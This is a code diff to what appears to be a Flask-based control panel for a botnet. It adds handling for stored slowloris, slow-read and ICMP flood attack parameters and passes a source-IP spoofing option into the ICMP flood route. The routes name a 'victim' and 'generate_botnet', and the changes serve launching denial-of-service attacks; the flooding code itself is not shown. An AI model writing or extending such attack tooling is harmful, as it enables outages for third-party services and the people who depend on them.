@@ -7,7 +7,10 @@ from .settings import client
 @app.route("/")
 def index():
     victim_data = db.get_victim_data()
-    return render_template("index.html", victim_data=victim_data)
+    slowloris_data = db.get_attack_args("slowloris")
+    slow_read_data = db.get_attack_args("slow_read")
+    icmp_flood_data = db.get_attack_args("icmp_flood_full")
+    return render_template("index.html", victim_data=victim_data, slow_read_data=slow_read_data, slowloris_data=slowloris_data, icmp_flood_data=icmp_flood_data)
 
 
 @app.route("/generate_botnet", methods=["POST", "GET"])
@@ -53,9 +56,9 @@ def icmp_flood():
     spoof = request.form.get('spoof_select')
     if(spoof == "yes"):
         ip_address = request.form["ip_address"]
-        db.icmp_flood_insert(ip_address)
+        db.icmp_flood_insert(spoof,ip_address)
     else:
-        db.icmp_flood_insert()
+        db.icmp_flood_insert(spoof)
     return "nothing"
 
 @app.route("/slowloris", methods=["POST"])
